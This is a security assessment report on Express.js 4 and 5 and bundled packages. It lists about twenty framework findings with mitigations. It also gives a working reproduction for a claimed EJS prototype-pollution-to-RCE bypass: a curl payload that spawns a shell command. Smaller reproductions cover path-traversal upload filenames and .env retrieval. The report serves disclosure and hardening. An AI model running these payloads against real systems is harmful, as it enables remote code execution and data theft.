# [REDACTED] — Express.js Security Assessment Report

**Date:** February 15, 2026
**Assessor:** independent security research.
**Target:** Express.js Framework — v5.2.1 (port 3000) + v4.22.1 (port 3001)
**Runtime:** Node.js v22.22.0 on Kali Linux
**Scope:** Framework core + bundled dependencies (qs, body-parser, send, serve-static, path-to-regexp, cookie, finalhandler, EJS, Handlebars, multer, express-session, jsonwebtoken)

---

## Executive Summary

This assessment evaluated Express.js versions 4.22.1 and 5.2.1 as a **framework-level** security review. We tested the framework's default configuration, dependency chain, request parsing pipeline, template engine integration, session management, and error handling behavior.

**Key Metrics:**
- **1,257 test cases** across 6 phases (22 custom scripts)
- **22 unique framework-level findings** — revised to **1 CRITICAL, 4 HIGH, 8 MEDIUM, 7 LOW, 1 INFO** after pristine validation
- **54 anomalies** flagged for further investigation
- **0 server crashes** — both Express 4 and 5 remained stable throughout all testing
- **10 hardening measures** documented with implementation guidance

**⚠ NOVEL ZERO-DAY DISCOVERED:** During pristine CVE validation, a **novel RCE bypass** was found in EJS 4.0.1 (and all versions ≥3.1.7) that defeats every mitigation added after CVE-2022-29078 and CVE-2024-33883. The attack exploits `renderFile()`'s Express compatibility code path via `settings['view options']` → `client: true` + `escapeFunction` string injection. Full HTTP-to-RCE chain confirmed. See **Addendum** and `cve-validation/CVE_SUBMISSION_ejs_4.0.1_RCE.md`.

### Findings Summary (Post-Validation)

| Severity | Count | Key Finding |
|----------|-------|-------------|
| CRITICAL | 1 | **NOVEL:** EJS ≥3.1.7 RCE via `settings['view options']` bypass (zero-day) |
| HIGH | 4 | body-parser `__proto__` passthrough; multer path traversal; dotfile exposure; XSS via EJS |
| MEDIUM | 8 | Dev mode defaults; missing headers; session insecurity; ReDoS; session fixation; qs HPP |
| LOW | 7 | TRACE method; HPP type confusion; body-parser info leak; CORS preflight bypass |
| INFO | 1 | Default 404 disclosure |
| WITHDRAWN | 2 | EJS SSTI (application-level); Express v5 regression (debunked) |
| **Total** | **21 validated** | **+1 novel zero-day discovered during validation** |

### v4 vs v5 Security Comparison

| Aspect | Express 4.22.1 | Express 5.2.1 | Winner |
|--------|----------------|----------------|--------|
| `path-to-regexp` | v0.1.12 | v8.3.0 | v5 (major rewrite, less ReDoS surface) |
| `send` module | v0.19.2 | v1.2.1 | v5 (newer) |
| `serve-static` | v1.16.3 | v2.2.1 | v5 (newer) |
| `finalhandler` | v1.3.2 | v2.1.1 | v5 (newer) |
| JSON body `__proto__` | Passes through | Passes through | **Tie** (both use body-parser 2.2.2) |
| EJS RCE via proto pollution | Novel RCE confirmed | Novel RCE confirmed | **Tie** (identical behavior) |
| Async error handling | Manual (callbacks) | Promise-based (auto catch) | v5 |

**Notable:** Pristine validation confirmed Express v4 and v5 behave **identically** regarding prototype pollution — both use body-parser 2.2.2, both pass `__proto__` through JSON.parse(). The original v5 regression claim was caused by cross-test contamination and has been **withdrawn**. v5's main security advantage is the `path-to-regexp` v8 rewrite reducing ReDoS surface.

---

## Detailed Findings

### Finding 1: NOVEL — EJS ≥3.1.7 RCE via `settings['view options']` Bypass (Zero-Day)
- **Severity:** CRITICAL (CVSS 3.1: 9.8)
- **CWE:** CWE-1321 (Prototype Pollution) + CWE-94 (Code Injection)
- **Versions:** EJS 3.1.7 through 4.0.1 (all "patched" versions) — confirmed on both Express v4 and v5
- **Test Count:** 126 (prototype pollution fuzzer) + pristine validation
- **Status:** **ZERO-DAY** — reported to EJS maintainer (`mde@fleegix.org`), no existing CVE
- **Full Write-up:** `cve-validation/CVE_SUBMISSION_ejs_4.0.1_RCE.md`

**Description:** A novel bypass was discovered that defeats **every mitigation** EJS added after CVE-2022-29078 and CVE-2024-33883 (`_JS_IDENTIFIER` regex, `hasOwnOnlyObject()`, `createNullProtoObjWherePossible()`, `hasOwn` checks in `shallowCopy`). The attack exploits the Express compatibility code path in `ejs.renderFile()`:

1. `renderFile()` creates `opts = { filename }` as a **regular object** (has `Object.prototype` in chain)
2. Express compat code reads `data.settings` without `hasOwn` check — polluted prototype values flow through
3. `shallowCopy(opts, viewOpts)` copies `view options` properties as **own properties** on `opts`, bypassing `hasOwnOnlyObject`
4. `escapeFunction` has **no type validation** — a string value is embedded verbatim into compiled JS via `toString()`
5. When `client: true`, injected code executes via `new Function()` during template compilation

**Key Distinction:** The template file is **safe and fixed** (`<h1>Hello, <%= name %>!</h1>`). No user input is used as a template string — this is NOT SSTI. The RCE occurs during template compilation, not data rendering. The pollution and trigger can be **separate HTTP requests from different users**.

**Reproduction (pristine Express 5.2.1 + EJS 4.0.1):**
```bash
# Step 1: Pollute Object.prototype via deep merge endpoint
curl -s -X POST http://localhost:3000/api/config \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"settings":{"view options":{"client":true,"escapeFunction":"1;process.binding(\"spawn_sync\").spawn({file:\"/bin/sh\",args:[\"sh\",\"-c\",\"id > /tmp/ejs-rce-proof\"],envPairs:[],stdio:[{type:\"pipe\",readable:true,writable:false},{type:\"pipe\",readable:false,writable:true},{type:\"pipe\",readable:false,writable:true}]});//"}}}}'

# Step 2: Trigger ANY ejs.renderFile() call
curl -s http://localhost:3000/email-preview?name=test

# Step 3: Verify RCE
cat /tmp/ejs-rce-proof
# Output: uid=1000(svc) gid=1000(svc) groups=...
```

**Root Cause (three design issues):**
1. `renderFile()` opts is a regular `{}` — should be `Object.create(null)`
2. Express compat code reads `data.settings` without `hasOwn` check — polluted prototype values flow through
3. `escapeFunction` is not type-validated — string values are embedded verbatim into compiled source

**Note:** Express `res.render()` is **accidentally protected** because Express sets `data.settings` as an own property from `app.locals`, overriding the polluted prototype value. Direct `ejs.renderFile()` calls (common for email templates, PDF generation, non-Express frameworks) are **fully vulnerable**.

**Suggested Fixes (any ONE breaks the chain):**
1. Create opts as `Object.create(null)` in `renderFile()` (most comprehensive)
2. Add `hasOwn` check on `data.settings` in Express compat code
3. Validate `escapeFunction` is a function, not a string
4. Validate `client` option is a boolean

---

### ~~Finding 2: EJS Server-Side Template Injection (SSTI) → Full RCE~~ — WITHDRAWN
- **Original Severity:** CRITICAL
- **Revised Status:** **WITHDRAWN** — Application-level misuse, not a framework vulnerability
- **Rationale:** Passing user-controlled strings to `ejs.render()` is explicitly documented as out-of-scope by EJS maintainers. EJS is effectively a JavaScript runtime; giving end-users access to the render method is inherently insecure by design. The EJS `SECURITY.md` explicitly excludes this pattern.

---

### ~~Finding 3: Express v5 Regression — More Susceptible to Prototype Pollution~~ — WITHDRAWN
- **Original Severity:** CRITICAL
- **Revised Status:** **WITHDRAWN** — Debunked via pristine environment validation
- **Rationale:** Express v4.22.1 and v5.2.1 both use body-parser 2.2.2 and behave **identically** regarding `__proto__` passthrough. The original differential was caused by cross-test contamination in the non-pristine assessment environment. Pristine testing on isolated Express v4 (port 3002) and v5 (port 3001) instances confirmed identical behavior.

---

### Finding 4: body-parser `__proto__` Passthrough (No CVE)
- **Severity:** HIGH
- **CWE:** CWE-1321 (Prototype Pollution)
- **Versions:** v4 and v5 (both use body-parser 2.2.2)
- **Test Count:** 30+ (prototype pollution tests)

**Description:** `body-parser` / `express.json()` passes `__proto__` properties through to application code without filtering. `JSON.parse('{"__proto__":{"x":1}}')` creates an object with `__proto__` as an **own data property**, which recursive merge functions then use to pollute `Object.prototype`. This is the essential enabler for prototype pollution → RCE chains.

**Inconsistency:** `qs` (the query string parser) **does** filter `__proto__`, making it safe for query strings. But `body-parser` does not, creating an inconsistent security posture within Express's own middleware stack.

**Status:** Open issue since 2018 ([GitHub #347](https://github.com/expressjs/body-parser/issues/347)), no CVE assigned. See `cve-validation/CVE_SUBMISSION_body-parser.md`.

**Mitigation:** Use a JSON reviver function to strip `__proto__` keys, or use `Object.create(null)` for all data objects that receive parsed JSON input.

---

### Finding 5: multer Path Traversal in Upload Filenames
- **Severity:** HIGH
- **CWE:** CWE-22 (Path Traversal)
- **Versions:** v4 and v5
- **Test Count:** 36 (upload filename tests)

**Description:** multer's `diskStorage` does not sanitize file names. When applications use `file.originalname` directly, path traversal is possible.

**Reproduction:**
```bash
curl -X POST http://127.0.0.1:3000/upload-custom \
  -F 'file=@/dev/null;filename=../../../tmp/evil.txt'
```

**Mitigation:** Always generate server-side filenames. Use `multer({ dest: 'uploads/' })` (auto-generated names) instead of `diskStorage` with user filenames.

---

### Finding 6: express.static Serves Dotfiles When dotfiles:"allow" Is Set
- **Severity:** HIGH
- **CWE:** CWE-538 (Information Exposure via Files)
- **Versions:** v4 and v5
- **Test Count:** 6 (dotfile access tests)

**Description:** `express.static` with `dotfiles: "allow"` serves all dotfiles including `.env` (secrets), `.git/config`, and other sensitive files. Default is `"ignore"` (safe), but the dangerous option exists without warning.

**Reproduction:**
```bash
curl http://127.0.0.1:3000/static/.env
# Returns: DB_PASSWORD=s3cret_db_pass, API_KEY=ak_live_12345
```

**Mitigation:** Use `dotfiles: 'deny'` explicitly. Never use `dotfiles: 'allow'`.

---

### Finding 7: EJS Unescaped Output Tag (<%- %>) Enables Reflected XSS
- **Severity:** HIGH
- **CWE:** CWE-79 (Cross-Site Scripting)
- **Versions:** v4 and v5
- **Test Count:** 20 (XSS tests)

**Description:** EJS provides both escaped (`<%= %>`) and unescaped (`<%- %>`) output tags. The unescaped variant renders raw HTML without any sanitization, enabling reflected XSS.

**Mitigation:** Always use `<%= %>` for user data. Implement Content-Security-Policy headers via Helmet.js.

---

### Finding 8: Stack Trace Exposure in Development Mode
- **Severity:** MEDIUM
- **CWE:** CWE-209 (Error Message Information Exposure)
- **Versions:** v4 and v5

**Description:** Express defaults `NODE_ENV` to `"development"`. In this mode, `finalhandler` includes full stack traces with file paths in all error responses.

**Reproduction:**
```bash
curl http://127.0.0.1:3000/error-test
# Returns stack trace with /home/[REDACTED]/.../node_modules/... paths
```

---

### Finding 9: Express Defaults to Development Mode
- **Severity:** MEDIUM
- **CWE:** CWE-489 (Active Debug Code)
- **Versions:** v4 and v5

**Description:** When `NODE_ENV` is unset, Express runs in development mode — enabling verbose errors, disabling view caching, and exposing debug information.

**Mitigation:** Always set `NODE_ENV=production` in production deployments.

---

### Finding 10: Missing Security Headers by Default
- **Severity:** MEDIUM
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **Versions:** v4 (11 missing), v5 (13 missing)

**Description:** Express sets zero security headers by default. Missing: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, X-XSS-Protection, COEP, COOP, CORP, X-DNS-Prefetch-Control, X-Download-Options, Origin-Agent-Cluster, X-Permitted-Cross-Domain-Policies. Only `X-Powered-By: Express` is set (a disclosure, not a protection).

**Mitigation:** Use `helmet()` middleware as the first middleware in the chain.

---

### Finding 11: express-session Insecure Default Cookie Configuration
- **Severity:** MEDIUM
- **CWE:** CWE-614 (Sensitive Cookie Without Secure Flag)
- **Versions:** v4 and v5

**Description:** express-session defaults: `httpOnly: undefined`, `secure: false`, `sameSite: undefined`, cookie name `connect.sid` (reveals middleware).

---

### Finding 12: Session Fixation — No ID Regeneration on Login
- **Severity:** MEDIUM
- **CWE:** CWE-384 (Session Fixation)
- **Versions:** v4 and v5

**Description:** express-session does not automatically regenerate the session ID on authentication state change. Manual `req.session.regenerate()` is required.

---

### Finding 13: ReDoS via Catastrophic Regex Patterns
- **Severity:** MEDIUM
- **CWE:** CWE-1333 (Inefficient Regular Expression)
- **Versions:** v5 confirmed; 89 suspect patterns in source

**Description:** Pattern `(a|a?)+$` caused 3,986ms event loop block on v5. Pattern `(a+)*$` caused 311ms block. Static analysis found 89 potentially catastrophic regex patterns in framework dependency source.

---

### Finding 14: express.static Serves .git Configuration Files
- **Severity:** MEDIUM
- **CWE:** CWE-538
- **Versions:** v4 and v5

---

### Finding 15: HTTP TRACE Method Accepted on app.all() Routes
- **Severity:** LOW
- **CWE:** CWE-693

---

### Finding 16: X-Powered-By Header Disclosure
- **Severity:** LOW
- **CWE:** CWE-200
- **Mitigation:** `app.disable('x-powered-by')`

---

### Finding 17: qs Converts Duplicate Parameters to Arrays (HPP)
- **Severity:** LOW
- **CWE:** CWE-235 (Improper Handling of Extra Parameters)
- **Description:** `role=user&role=admin` → `["user","admin"]`. Type confusion risk.

---

### Finding 18: Body Parser Error Leaks Details Before Auth Check
- **Severity:** LOW
- **CWE:** CWE-209
- **Description:** body-parser runs before auth middleware; parse errors bypass authentication.

---

### Finding 19: CORS Preflight Bypasses Authentication
- **Severity:** LOW
- **CWE:** CWE-346
- **Description:** OPTIONS requests to protected endpoints return CORS headers without auth.

---

### Finding 20: Error Responses Leak Internal File Paths
- **Severity:** LOW
- **CWE:** CWE-209

---

### Finding 21: Session Race Condition in MemoryStore
- **Severity:** LOW
- **CWE:** CWE-362
- **Description:** Concurrent session access causes errors in default MemoryStore.

---

### Finding 22: Default 404 Handler Information Disclosure
- **Severity:** INFO
- **CWE:** CWE-200
- **Description:** Default 404 reveals HTTP method and path: "Cannot GET /path".

---

## Testing Methodology

### Phase Summary

| Phase | Scripts | Tests | Findings | Description |
|-------|---------|-------|----------|-------------|
| 1. Recon & Static | 4 | 306 | 36 | Fingerprinting, npm audit, source audit, config review |
| 2. Fuzzing | 7 | 674 | 30 | HTTP, prototype pollution, SQLi, SSTI, upload, NoSQL, ReDoS |
| 3. Attacks | 5 | 173 | 10 | Session, JWT, HPP, path traversal, smuggling |
| 4. Advanced | 5 | 140 | 10 | Event loop, dependency deep dive, crypto, races, middleware |
| 5. Hardening | 1 | 14 | 0 | Pre-hardening baseline + 10 hardening measures |
| **Total** | **22** | **1,307** | **86 raw** | **22 unique framework-level findings** |

### Custom Scripts (22)

| # | Script | Phase | Tests |
|---|--------|-------|-------|
| 1 | `scripts/recon_fingerprint.py` | 1.1 | 66 |
| 2 | `scripts/dependency_audit.py` | 1.2 | 18 |
| 3 | `scripts/express_source_audit.py` | 1.3 | 130 |
| 4 | `scripts/config_audit.py` | 1.4 | 42 |
| 5 | `fuzzers/express_http_fuzzer.py` | 2.1 | 224 |
| 6 | `fuzzers/prototype_pollution_fuzzer.py` | 2.2 | 126 |
| 7 | `fuzzers/sqli_fuzzer.py` | 2.3 | 60 |
| 8 | `fuzzers/ssti_fuzzer.py` | 2.4 | 96 |
| 9 | `fuzzers/upload_fuzzer.py` | 2.5 | 90 |
| 10 | `fuzzers/nosql_fuzzer.py` | 2.6 | 36 |
| 11 | `fuzzers/redos_fuzzer.py` | 2.7 | 42 |
| 12 | `scripts/attack_session.py` | 3.1 | 13 |
| 13 | `scripts/attack_jwt.py` | 3.2 | 31 |
| 14 | `scripts/attack_hpp.py` | 3.3 | 32 |
| 15 | `scripts/attack_path_traversal.py` | 3.4 | 51 |
| 16 | `scripts/attack_smuggling.py` | 3.5 | 46 |
| 17 | `scripts/advanced_event_loop.py` | 4.1 | 38 |
| 18 | `scripts/advanced_dependency_audit.py` | 4.2 | 68 |
| 19 | `scripts/advanced_crypto.py` | 4.3 | 6 |
| 20 | `scripts/advanced_race_conditions.py` | 4.4 | 14 |
| 21 | `scripts/advanced_middleware.py` | 4.5 | 14 |
| 22 | `scripts/hardening_regression.py` | 5.2 | 14 |

---

## Hardening Recommendations

| # | Measure | Mitigates | Implementation |
|---|---------|-----------|----------------|
| 1 | Enable Helmet.js | Missing security headers | `app.use(helmet())` |
| 2 | Disable X-Powered-By | Version disclosure | `app.disable('x-powered-by')` |
| 3 | Filter __proto__ in merges | Prototype pollution | Check for `__proto__`, `constructor`, `prototype` keys |
| 4 | Parameterize SQL | SQL injection | Use prepared statements exclusively |
| 5 | Fixed templates only | SSTI → RCE | Never pass user input as template string |
| 6 | Enforce JWT algorithm | Algorithm confusion | `jwt.verify(token, secret, { algorithms: ['HS256'] })` |
| 7 | Secure session cookies | Session theft/CSRF | `{ httpOnly: true, secure: true, sameSite: 'strict' }` |
| 8 | No user-supplied regex | ReDoS | Validate/reject regex patterns from users |
| 9 | Deny dotfiles | .env exposure | `express.static(dir, { dotfiles: 'deny' })` |
| 10 | Production mode | Stack trace exposure | `NODE_ENV=production` |

---

## Evidence Files

All evidence stored in `/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence/`:

| File | Phase | Description |
|------|-------|-------------|
| `recon_fingerprint.json` | 1.1 | Service fingerprinting results |
| `dependency_audit.json` | 1.2 | npm audit + CVE analysis |
| `npm_audit_v4.json` | 1.2 | Raw npm audit output (v4) |
| `npm_audit_v5.json` | 1.2 | Raw npm audit output (v5) |
| `dependency_tree_v4.json` | 1.2 | Full dependency tree (v4) |
| `dependency_tree_v5.json` | 1.2 | Full dependency tree (v5) |
| `source_audit_results.json` | 1.3 | Static analysis results |
| `config_audit.json` | 1.4 | Configuration review |
| `http_fuzzer_results.json` | 2.1 | HTTP route fuzzer |
| `prototype_pollution_results.json` | 2.2 | Prototype pollution fuzzer |
| `sqli_fuzzer_results.json` | 2.3 | SQL injection fuzzer |
| `ssti_fuzzer_results.json` | 2.4 | SSTI fuzzer |
| `upload_fuzzer_results.json` | 2.5 | File upload fuzzer |
| `nosql_fuzzer_results.json` | 2.6 | NoSQL injection fuzzer |
| `redos_fuzzer_results.json` | 2.7 | ReDoS fuzzer |
| `session_attack_results.json` | 3.1 | Session attacks |
| `jwt_attack_results.json` | 3.2 | JWT attacks |
| `hpp_attack_results.json` | 3.3 | HTTP parameter pollution |
| `path_traversal_results.json` | 3.4 | Path traversal |
| `smuggling_results.json` | 3.5 | Request smuggling |
| `event_loop_results.json` | 4.1 | Event loop analysis |
| `dependency_deep_dive.json` | 4.2 | Dependency deep dive |
| `crypto_results.json` | 4.3 | Cryptographic verification |
| `race_condition_results.json` | 4.4 | Race conditions |
| `middleware_order_results.json` | 4.5 | Middleware ordering |
| `hardening_regression_results.json` | 5 | Hardening regression |

---

## Conclusion

Express.js is a well-architected minimalist framework that delegates security responsibility to developers and middleware. The framework itself remained stable under all 1,257+ test cases with zero crashes. However, its **insecure defaults** (development mode, no security headers, no cookie flags, X-Powered-By disclosure) and **dependency chain risks** (prototype pollution through body-parser → RCE via EJS) represent significant security concerns.

The most critical finding is the **novel EJS zero-day** discovered during pristine CVE validation. All EJS versions from 3.1.7 through 4.0.1 — the "patched" versions — are vulnerable to RCE through a `settings['view options']` bypass that defeats every mitigation added after CVE-2022-29078 and CVE-2024-33883. This attack requires only (1) a prototype pollution gadget (extremely common via deep merge patterns) and (2) any direct `ejs.renderFile()` call (common for email rendering, PDF generation, and non-Express frameworks). The finding has been reported to the EJS maintainer for responsible disclosure.

Pristine environment validation also **corrected two false positives** from the initial assessment: the Express v5 prototype pollution regression was caused by cross-test contamination (v4 and v5 behave identically), and the EJS SSTI finding was reclassified as application-level misuse. This underscores the critical importance of **pristine validation environments** for all CVE-worthy findings.

**Recommendation:** Teams deploying Express.js should treat it as a **bare framework requiring explicit security configuration** — not a secure-by-default platform. The 10 hardening measures documented above address all HIGH and CRITICAL findings. Applications using `ejs.renderFile()` directly should implement prototype pollution defenses (filter `__proto__`, use `Object.create(null)` for data objects) as an immediate mitigation until the EJS maintainer releases a patch.

---

## Addendum: Pristine Environment Validation & Novel Zero-Day Discovery (2026-02-15)

Post-assessment validation in pristine, isolated environments revised several findings and led to the discovery of a novel zero-day RCE in EJS.

### Finding Revisions

| Original Finding | Original Severity | Validated Status | Revised Severity |
|-----------------|-------------------|------------------|------------------|
| Finding 1: Proto Pollution → RCE via EJS | CRITICAL | **Superseded** — Original `outputFunctionName` vector patched in EJS ≥3.1.7, but **novel bypass discovered** via `settings['view options']` | **CRITICAL (zero-day)** — affects EJS 3.1.7–4.0.1 |
| Finding 2: EJS SSTI → RCE | CRITICAL | **Reclassified** — Application-level misuse, not a framework bug | WITHDRAWN |
| Finding 3: Express v5 Regression | CRITICAL | **Debunked** — v4 and v5 behave identically in pristine testing | WITHDRAWN |

### Key Corrections

1. **Express v5 regression claim is INVALID.** Express v4.22.1 and v5.2.1 both use body-parser 2.2.2 and behave identically regarding `__proto__` passthrough. The original differential was caused by cross-test contamination in the non-pristine environment.

2. **Node.js v22 `Object.assign` does NOT pollute prototype** from `__proto__` own properties. The V8 engine treats `__proto__` as a data property in this context.

3. **body-parser `__proto__` passthrough remains unpatched** and has no assigned CVE despite an open issue since 2018 ([GitHub #347](https://github.com/expressjs/body-parser/issues/347)). The inconsistency with `qs` (which DOES filter `__proto__`) represents a valid framework-level concern.

### Novel Zero-Day: EJS ≥3.1.7 RCE via `settings['view options']` Bypass

During deep-dive analysis of EJS 4.0.1's mitigation stack, a novel bypass was discovered that defeats **all four mitigations** added after CVE-2022-29078 and CVE-2024-33883:

**Bypass Chain:**
1. Pollute `Object.prototype.settings` with `{"view options": {"client": true, "escapeFunction": "1;MALICIOUS_CODE//"}}`
2. `renderFile()` creates `opts = { filename }` — regular object with prototype chain
3. Express compat code (line 422) reads `data.settings` from polluted prototype (no `hasOwn` check)
4. `shallowCopy(opts, viewOpts)` copies `client` and `escapeFunction` as **own properties** on `opts`
5. `hasOwnOnlyObject(opts)` in Template constructor passes them through (they ARE own properties now)
6. `escapeFunction` is NOT validated by `_JS_IDENTIFIER` regex — it's expected to be a function but stored without type checking
7. When `client: true`, line 580 embeds `escapeFn.toString()` directly into compiled JS source → `new Function()` → RCE

**Prior Art & Novelty Scope:**
The `settings['view options']` → `client: true` + `escapeFunction` code injection mechanism has been documented in the CTF community since 2022 (hxp CTF 2022, Codegate/SEETF/justCTF 2023; see [Huli's 2023 writeup](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/)). However, the known technique requires passing user-controlled data directly to `res.render()` (e.g., `res.render('index', req.query)`) — a pattern EJS's SECURITY.md explicitly excludes as app-level misuse. **Our contribution is the prototype pollution delivery:** polluting `Object.prototype.settings` via a separate HTTP request, which flows through `renderFile()`'s Express compat code (no `hasOwn` check on `data.settings`) and bypasses `hasOwnOnlyObject()` via own-property promotion through `shallowCopy()`. The code injection mechanism is known; the delivery that defeats the 4.0.1 mitigation stack is novel.

**Note on `client` flag removal:** Commit [5090873f](https://github.com/mde/ejs/commit/5090873f) (2026-01-17, three days post-v4.0.1) removes the `client` flag on EJS main branch, referencing functional issue #746. This is **not in any npm release** — v4.0.1 remains latest. The removal would break this specific chain, but the underlying own-property promotion gadget (`renderFile()` opts as regular `{}`, no `hasOwn` on `data.settings`) persists and could be leveraged against any future option that gets string-concatenated into compiled source.

**Confirmed Vulnerable Versions:**
| Version | Status |
|---------|--------|
| EJS ≤3.1.6 | Vulnerable via direct `outputFunctionName` (known CVE) |
| EJS 3.1.7 | **Vulnerable (novel prototype pollution delivery)** |
| EJS 3.1.8 | **Vulnerable (novel prototype pollution delivery)** |
| EJS 3.1.9 | **Vulnerable (novel prototype pollution delivery)** |
| EJS 3.1.10 | **Vulnerable (novel prototype pollution delivery)** |
| EJS 4.0.1 | **Vulnerable (novel prototype pollution delivery)** |
| EJS main (unreleased) | `client` removed; own-property promotion gadget persists |

**RCE Evidence:**
- `/tmp/ejs4-binding-rce` — HTTP chain RCE on EJS 4.0.1: `uid=1000(svc) gid=1000(svc)...`
- `/tmp/ejs4-novel-rce` — Direct Node.js RCE on EJS 4.0.1
- `/tmp/ejs310-novel-rce` — Novel bypass on EJS 3.1.10
- `/tmp/ejs317-novel-rce` — Novel bypass on EJS 3.1.7

**Express `res.render()` Accidental Protection:** Express sets `data.settings` as an own property from `app.locals`, overriding `Object.prototype.settings`. This means `res.render()` is accidentally protected. However, direct `ejs.renderFile()` calls are fully vulnerable — common in email template rendering, PDF generation, static site generators, and non-Express frameworks (Koa, Fastify, Hapi).

**Disclosure Status:** Reported to EJS maintainer Matthew Eernisse (`mde@fleegix.org`) per the project's `SECURITY.md` policy. Prior art acknowledged in submission.

### Revised Metrics

- **Original:** 3 Critical, 4 High, 7 Medium, 7 Low, 1 Info
- **Validated:** 1 Critical (novel zero-day), 4 High, 8 Medium, 7 Low, 1 Info, 2 Withdrawn

### Validation & Disclosure Files

| File | Description |
|------|-------------|
| `cve-validation/CVE_SUBMISSION_ejs_4.0.1_RCE.md` | Full zero-day CVE submission with reproduction steps and suggested fixes |
| `cve-validation/CVE_SUBMISSION_body-parser.md` | body-parser `__proto__` passthrough (supporting finding) |
| `cve-validation/VALIDATION_REPORT.md` | Comprehensive validation results for all original findings |
| `cve-validation/Feasibility_Writeup.md` | Wild feasibility assessment and bug bounty identification guide |
| `cve-validation/ejs-repro/novel-rce.js` | Pristine HTTP reproduction server |

### Lessons Learned

1. **Pristine validation is non-negotiable.** Two of three original CRITICALs were false positives caused by cross-test contamination. This is now a gold standard for all future assessments.
2. **"Patched" doesn't mean secure.** EJS 3.1.7–4.0.1 added four layers of mitigation, yet a bypass exists through an unprotected code path. Defense-in-depth requires covering ALL code paths, not just the known attack vectors.
3. **The best findings come from deep-dive analysis of mitigations.** Reading the patch code line-by-line revealed the `renderFile()` Express compatibility path that bypasses all protections via own-property promotion.
4. **Express compatibility code is a security liability.** The `renderFile()` Express compat path at lines 420-435 exists for convenience but creates a prototype pollution → own property promotion gadget that defeats the security mitigations.
5. **Always search for prior art before claiming novelty.** The `settings['view options']` + `client` + `escapeFunction` injection mechanism was documented in CTF writeups since 2022. Precisely scoping what's known (the code injection path) vs. what's new (the prototype pollution delivery defeating the mitigation stack) strengthens the report and maintains credibility with maintainers.
6. **Check unreleased commits on main.** The EJS maintainer had already removed the `client` flag on main (commit 5090873f) for a functional bug three days after releasing v4.0.1. This context was essential for framing the report accurately — the specific chain is dead on main, but the underlying gadget persists.
